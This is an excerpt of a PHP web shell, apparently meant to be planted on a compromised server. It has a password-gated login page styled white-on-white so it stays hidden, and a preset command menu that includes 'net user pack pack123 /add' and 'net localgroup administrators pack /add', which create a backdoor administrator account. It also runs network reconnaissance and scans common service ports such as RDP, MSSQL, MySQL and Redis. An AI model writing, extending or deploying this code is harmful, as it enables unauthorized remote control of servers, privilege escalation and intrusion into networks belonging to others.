...
header($tcp.$_SERVER['HTTP_HOST'].$_SERVER['SCRIPT_NAME']);
...
if($_COOKIE['postpass'] != md5(postpass)){
	if($_POST['postpass']){
		if($_POST['postpass'] == postpass){
			...
			header('location:'.$tcp.$_SERVER['HTTP_HOST'].$_SERVER['SCRIPT_NAME']);
		}else{
...
function sFull(i){
	Str = new Array(11);
	Str[0] = "dir";
	Str[1] = "net user pack pack123 /add";
	Str[2] = "net localgroup administrators pack /add";
	Str[3] = "netstat -ano";
	Str[4] = "ipconfig";
...
END;
	...
	$Port_port = isset($_POST['port']) ? $_POST['port'] : '21|22|23|25|80|110|135|139|445|1433|3306|3389|43958|5631|2049|873|6379';
print<<<END
<form method="POST">
...
print<<<END
<style type="text/css">body,td{font-size: 12px;color:#FFFFFF;background-color:#FFFFFF;}input,select,textarea{font-size: 12px;background-color:#FFFFFF;border:1px solid #fff}.C{background-color:#FFFFFF;border:0px}.cmd{background-color:#000;color:#FFF}body{margin: 0px;margin-left:4px;}BODY {SCROLLBAR-FACE-COLOR: #FFFFFF; SCROLLBAR-HIGHLIGHT-COLOR: #FFFFFF; SCROLLBAR-SHADOW-COLOR: #FFFFFF; SCROLLBAR-DARKSHADOW-COLOR: #FFFFFF; SCROLLBAR-3DLIGHT-COLOR: #FFFFFF; SCROLLBAR-ARROW-COLOR: #FFFFFF;SCROLLBAR-TRACK-COLOR: #FFFFFF;}a{color:#ddd;text-decoration: none;}a:hover{color:green;background:#000}.am{color:#888;font-size:11px;}</style>
<body style="FILTER: progid:DXImageTransform.Microsoft.Gradient(gradientType=0,startColorStr=#FFFFFF,endColorStr=#FFFFFF)" scroll=no><center><div style='width:500px;border:0px solid #222;padding:22px;margin:100px;'><br><a href='{$myurl}' target='_blank'>{$shellname}</a><br><br><form method='post'><input name='postpass' type='password' size='22'> <input type='submit' value=''><br><br><br><font color="green"></font><br></div></center>
END;
}
